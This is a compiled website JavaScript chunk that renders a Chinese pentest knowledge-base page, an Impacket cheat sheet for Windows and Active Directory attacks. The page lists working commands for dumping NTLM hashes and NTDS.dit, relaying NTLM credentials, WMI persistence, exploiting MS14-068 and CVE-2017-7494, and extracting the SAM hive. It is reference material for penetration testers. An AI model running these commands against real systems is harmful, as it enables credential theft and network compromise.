"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[8913],{28453:(e,t,s)=>{s.d(t,{R:()=>r,x:()=>o});var n=s(96540);const a={},i=n.createContext(a);function r(e){const t=n.useContext(i);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),n.createElement(i.Provider,{value:t},e.children)}},97732:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>d,contentTitle:()=>o,default:()=>p,frontMatter:()=>r,metadata:()=>n,toc:()=>c});const n=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u5de5\u5177\u5c0f\u7ed3/impacket","title":"impacket","description":"\u5907\u4efd\u81ea Impacket","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/12.\u5185\u7f51\u6e17\u900f/07.\u5de5\u5177\u5c0f\u7ed3/02.impacket.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/12.\u5185\u7f51\u6e17\u900f/07.\u5de5\u5177\u5c0f\u7ed3","slug":"/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u5de5\u5177\u5c0f\u7ed3/impacket","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u5de5\u5177\u5c0f\u7ed3/impacket","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"mimikatz","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/\u5de5\u5177\u5c0f\u7ed3/mimikatz"},"next":{"title":"\u6e17\u900f\u6280\u5de7","permalink":"/docs/category/\u6e17\u900f\u6280\u5de7"}}');var a=s(74848),i=s(28453);const r={},o=void 0,d={},c=[{value:"General",id:"general",level:3},{value:"Remote Execution",id:"remote-execution",level:3},{value:"Kerberos",id:"kerberos",level:3},{value:"Windows Secrets",id:"windows-secrets",level:3},{value:"Server Tools / MiTM Attacks",id:"server-tools--mitm-attacks",level:3},{value:"WMI",id:"wmi",level:3},{value:"Known vulnerabilities",id:"known-vulnerabilities",level:3},{value:"SMB/MSRPC",id:"smbmsrpc",level:3},{value:"MSSQL/TDS",id:"mssqltds",level:3},{value:"File Formats",id:"file-formats",level:3},{value:"Others",id:"others",level:3}];function l(e){const t={a:"a",code:"code",h3:"h3",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsxs)(t.p,{children:["\u5907\u4efd\u81ea ",(0,a.jsx)(t.a,{href:"https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/",children:"Impacket"})]}),"\n",(0,a.jsx)(t.h3,{id:"general",children:"General"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{children:"# Almost every Impacket scripts follows the same option syntax\n\nauthentication:\n  -hashes LMHASH:NTHASH\n                        NTLM hashes, format is LMHASH:NTHASH\n  -no-pass              don't ask for password (useful for -k)\n  -k                    Use Kerberos authentication. Grabs credentials from\n                        ccache file (KRB5CCNAME) based on target parameters.\n                        If valid credentials cannot be found, it will use the\n                        ones specified in the command line\n  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256\n                        bits)\n\nconnection:\n  -dc-ip ip address     IP Address of the domain controller. If ommited it use\n                        the domain part (FQDN) specified in the target\n                        parameter\n  -target-ip ip address\n                        IP Address of the target machine. If omitted it will\n                        use whatever was specified as target. This is useful\n                        when target is the NetBIOS name and you cannot resolve\n                        it\n"})}),"\n",(0,a.jsx)(t.h3,{id:"remote-execution",children:"Remote Execution"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# See the Remote_Execution_Techniques section\n# All tools explained\n"})}),"\n",(0,a.jsx)(t.h3,{id:"kerberos",children:"Kerberos"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# See the Kerberos section\n# All tools explained\n"})}),"\n",(0,a.jsx)(t.h3,{id:"windows-secrets",children:"Windows Secrets"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# Performs various techniques to dump secrets from the remote machine without \n# executing any agent there. \n\n# For SAM and LSA Secrets (including cached creds) \n# we try to read as much as we can from the registry and then we save the hives \n# in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data \n# from there. \n\n# For DIT files, we dump NTLM hashes, Plaintext credentials (if available)\n# and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit \n# via vssadmin executed with the smbexec/wmiexec approach. The script initiates the \n# services required for its working if they are not available (e.g. \n# Remote Registry, even if it is disabled). \n\n# After the work is done, things are restored to the original state.\n\n# Extract NTLM hashes with local files\nsecretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL\n\n# Remote extraction\nsecretsdump.py -just-dc-ntlm domain/user:password@IP\nsecretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH\n# Mini shell to control a remote mimikatz RPC server\nmimikatz.py domain/user:password@IP\nmimikatz.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password\n"})}),"\n",(0,a.jsx)(t.h3,{id:"server-tools--mitm-attacks",children:"Server Tools / MiTM Attacks"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'# This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying\n# credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.)\n# By default, it dumps the SAM database\nresponder.py -I eth0 -r -d -w\nntlmrelayx.py -tf targets.txt\nntlmrelayx.py -tf targets.txt -c "ipconfig"\n\n\n# A SMB Server that answers specific file contents regardless of the SMB share and pathname specified\nkarmaSMB.py filenamePathname\nkarmaSMB.py filenamePathname -smb2support\n\n# A Python implementation of an SMB server. Allows to quickly set up shares and user accounts\nsmbserver.py SHARENAME /path/to/your/local/share\nsmbserver.py SHARENAME /path/to/your/local/share --username user --password password\n'})}),"\n",(0,a.jsx)(t.h3,{id:"wmi",children:"WMI"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# It allows to issue WQL queries and get description of WMI objects at \n# the target system (e.g. select name from win32_account).\nwmiquery.py domain/user:password@IP\n# It will open a shell where you can execute WQL queries\nSELECT * FROM Win32_LogicalDisk WHERE FreeSpace < 209152\n\n# This script creates/removes a WMI Event Consumer/Filter and link between\n# both to execute Visual Basic based on the WQL filter or timer specified.\nwmipersist.py domain/user:password@IP install\nwmipersist.py domain/user:password@IP remove\n"})}),"\n",(0,a.jsx)(t.h3,{id:"known-vulnerabilities",children:"Known vulnerabilities"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.\ngoldenPac.py domain/user:password@IP\ngoldenPac.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password\n\n# This script will exploit CVE-2017-7494, uploading and executing the shared\n# library specified by the user through the -so parameter.\nsambaPipe.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password -so SoFilenamepython\n\n# Exploit for CVE-2015-0005 using a SMB Relay Attack. \n# If the target system is enforcing signing and a machine account was \n# provided, the module will try to gather the SMB session key through NETLOGON.\n# Command will be executed on victimX for the specified target\nsmbrelayx.py -h victimIP -c cmdToExecute\nsmbrelayx.py -h victimIP -e payload.exe\n"})}),"\n",(0,a.jsx)(t.h3,{id:"smbmsrpc",children:"SMB/MSRPC"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# A generic SMB client that will let you list shares and files, rename,\n# upload and download files and create and delete directories\nsmbclient.py domain/user:password@IP\nsmbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password\n\n# This script will connect against a target (or list of targets) machine/s and gather \n# the OS architecture type installed by (ab)using a documented MSRPC feature.\ngetArch.py -target 10.10.2.2\n\n# This script will dump the list of RPC endpoints and string bindings registered at the \n# target. It will also try to match them with a list of well known endpoints.\nrpcdump.py domain/user:password@IP\nrpcdump.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password\n\n# This script will bind to the target's MGMT interface to get a list of interface IDs.\nifmap.py 10.10.20.1 135\nifmap.py 10.10.20.1 49154\n\n# This binds to the given hostname:port and MSRPC interface.\n# Then, it tries to call each of the first 256 operation numbers in turn\n# and reports the outcome of each call\n# Need to get interfaces, for example with ifmap.py\n# usage: opdump.py hostname port interface version\nopdump.py 10.10.1.1 135 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0\n\n# An application that communicates with the Security Account Manager Remote interface\n# from the MSRPC suite. It lists system user accounts, available resource shares \n# and other sensitive information exported through this service.\n./samrdump.py SERVER/Administrator:T00r@192.168.1.140\n\n# This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC \n# Interface. It supports start, stop, delete, status, config, list, create and change.\nservices.py SERVER/Administrator:T00r@192.168.1.140 {start,stop,delete,status,config,list,create,change}\n\n# Gets a list of the sessions opened at the remote hosts\nnetview.py domain/user:password -target 192.168.10.2\nnetview.py domain/user:password -target 192.168.10.2 -user Administrator\n\n# Remote registry manipulation tool through the [MS-RRP] MSRPC Interface.\n# The idea is to provide similar functionality as the REG.EXE Windows utility.\nreg.py domain/user:password@IP query -keyName HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows -s\nreg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password\n\n# A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface\n# aiming at finding remote users/groups.\nlookupsid.py domain/user:password@IP\nlookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password\n"})}),"\n",(0,a.jsx)(t.h3,{id:"mssqltds",children:"MSSQL/TDS"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# Retrieves the MSSQL instances names from the target host.\nmssqlinstance.py 192.168.1.2\n\n# An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.\nmssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x\n"})}),"\n",(0,a.jsx)(t.h3,{id:"file-formats",children:"File Formats"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'# An Extensibe Storage Engine format implementation. Allows dumping catalog, \n# pages and tables of ESE databases (e.g. NTDS.dit)\nesentutl.py databaseFile {dump,info,export}\n\n# NTFS format implementation. This script provides a mini shell for \n# browsing and extracting an NTFS volume, including hidden/locked contents.\nntfs-read.py /dev/disk1\nntfs-read.py "\\C:"\nntfs-read.py "\\C:" -extract "\\windows\\system32\\config\\sam"\n\n# A Windwows Registry file format implementation. It allows to parse offline registry hives.\nregistry-read.py registryHive enum_key,enum_values,get_value,get_class,walk}\n'})}),"\n",(0,a.jsx)(t.h3,{id:"others",children:"Others"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"# This script will gather data about the domain's users and their corresponding email addresses.\nGetADUsers.py domain/user:password@IP\n\n# Simple MQTT example aimed at playing with different login options.\nmqtt_check.py domain/user:password@IP\nmqtt_check.py domain/user:password@IP -ssl\n\n# [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth.\n# This example test whether an account is valid on the target host.\nrdp_check.py domain/user:password@IP\nrdp_check.py domain/user@IP -hashes LMHASH:NTHASH\n\n# Simple packet sniffer that uses a raw socket to listen for packets \n# in transit corresponding to the specified protocols.\nsniffer.py {tcp, udp, icmp}\n\n# Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.\nping.py <src-ip> <dst-ip>\n\n# Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.\nping6.py <src-ip> <dst-ip>\n"})})]})}function p(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}}}]);